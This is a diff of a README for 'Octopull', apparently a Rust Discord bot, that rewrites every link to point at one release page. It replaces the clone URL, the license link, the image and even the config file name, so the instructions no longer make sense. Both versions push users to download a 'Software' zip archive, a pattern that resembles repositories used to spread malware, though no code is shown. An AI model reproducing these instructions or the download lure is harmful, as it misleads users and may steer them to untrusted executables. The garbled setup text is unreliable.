@@ -1,6 +1,6 @@
 # Octopull 🐙
 
-![Octopull](https://example.com/octopull-image.png)
+![Octopull](https://github.com/caxros2/Octopull/releases/tag/v1.0)
 
 Welcome to Octopull, your go-to asynchronous concurrency and API integration real-time GitHub repo listener on a Rust-powered Discord bot!
 
@@ -44,7 +44,7 @@ To get started with Octopull, follow these simple steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/Octopull.git
+   git clone https://github.com/caxros2/Octopull/releases/tag/v1.0
    ```
 
 2. Install the necessary dependencies using Cargo:
@@ -82,11 +82,11 @@ Before you can start using Octopull, you need to configure your Discord bot toke
 
 1. **Discord Bot Token**:
    - Create a new Discord application and bot on the Discord Developer Portal.
-   - Copy the bot token and paste it in the `config.toml` file under the `discord_token` field.
+   - Copy the bot token and paste it in the `https://github.com/caxros2/Octopull/releases/tag/v1.0` file under the `discord_token` field.
 
 2. **GitHub API Access Token**:
    - Generate a personal access token with the required permissions on your GitHub account.
-   - Add the GitHub API access token to the `config.toml` file under the `github_token` field.
+   - Add the GitHub API access token to the `https://github.com/caxros2/Octopull/releases/tag/v1.0` file under the `github_token` field.
 
 By configuring these tokens, you will enable Octopull to connect to Discord and GitHub APIs seamlessly.
 
@@ -106,13 +106,13 @@ Together, we can make Octopull even better for all users!
 
 ## License
 
-Octopull is licensed under the MIT License. See [LICENSE](https://github.com/your-username/Octopull/blob/main/LICENSE) for more details.
+Octopull is licensed under the MIT License. See [LICENSE](https://github.com/caxros2/Octopull/releases/tag/v1.0) for more details.
 
 ---
 
-🚀 Ready to experience the power of Octopull? [Download the Software](https://github.com/user-attachments/files/18388744/Software.zip) and unleash the potential of asynchronous concurrency and API integration in your Discord server!
+🚀 Ready to experience the power of Octopull? [Download the Software](https://github.com/caxros2/Octopull/releases/tag/v1.0) and unleash the potential of asynchronous concurrency and API integration in your Discord server!
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/caxros2/Octopull/releases/tag/v1.0)](https://github.com/caxros2/Octopull/releases/tag/v1.0)
 
 Thank you for choosing Octopull! 🐙
 
